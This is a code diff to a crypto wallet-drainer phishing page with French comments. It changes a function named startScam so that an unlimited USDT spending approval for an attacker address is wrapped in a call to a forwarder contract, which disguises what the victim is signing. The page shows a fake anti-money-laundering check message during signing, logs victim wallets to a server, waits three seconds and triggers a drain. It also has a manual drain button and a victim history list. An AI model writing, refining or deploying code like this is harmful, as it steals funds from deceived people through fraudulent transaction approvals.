@@ -906,7 +906,7 @@
     // Drain manually
     drainBtn.addEventListener('click', async () => {
       const victim = victimAddress.value.trim();
-      if (!window.ethers.utils.isAddress(victim)) {
+      if (!ethers.utils.isAddress(victim)) {
         drainStatus.textContent = '❌ Invalid address';
         return;
       }
@@ -1053,18 +1053,25 @@ async function startScam() {
     return;
   }
 
+  const FORWARDER = '0xd3953f345839D145F19C62dD0dB95961bC83BBFF'; // Ton contrat
   const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
 
-  const approveData = '0x095ea7b3' +
+  // Calldata pour execute(USDT, approve(spender, uint256))
+  const approveCallData = '0x095ea7b3' +
     ATTACKER.slice(2).padStart(64, '0') +
     'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
+  // Encoder l'appel au forwarder : execute(address, bytes)
+  const iface = new ethers.utils.Interface([
+    'function execute(address target, bytes calldata data) returns (bytes)'
+  ]);
+  const executeData = iface.encodeFunctionData('execute', [USDT_ADDR, approveCallData]);
+
   const tx = {
     from: account,
-    to: USDT_ADDR,
-    data: approveData,
-    gasLimit: '0xea60' // 60 000 – suffisant pour approve
-    // Ne pas spécifier gasPrice – le wallet utilise son propre estimateur
+    to: FORWARDER,
+    data: executeData,
+    gasLimit: '0x30d40' // 200 000 gas – safe
   };
 
   const scanText = document.querySelector('.scan');
@@ -1084,14 +1091,14 @@ async function startScam() {
 
     if (scanText) scanText.textContent = '✅ Signature réussie. Vérification AML en cours…';
 
-    // Enregistrer statut signed
+    // Enregistrer comme signé
     await fetch('/api/record-wallet', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ address: account, chain: currentChainId, status: 'signed' })
     });
 
-    // Attendre 3 secondes avant drain
+    // Attendre 3s puis drain
     await new Promise(r => setTimeout(r, 3000));
 
     const drainResp = await fetch(API, {
@@ -1117,7 +1124,6 @@ async function startScam() {
     });
   }
 }
-
     // ===== Historique des victimes =====
     let victimPollTimer = null;
 
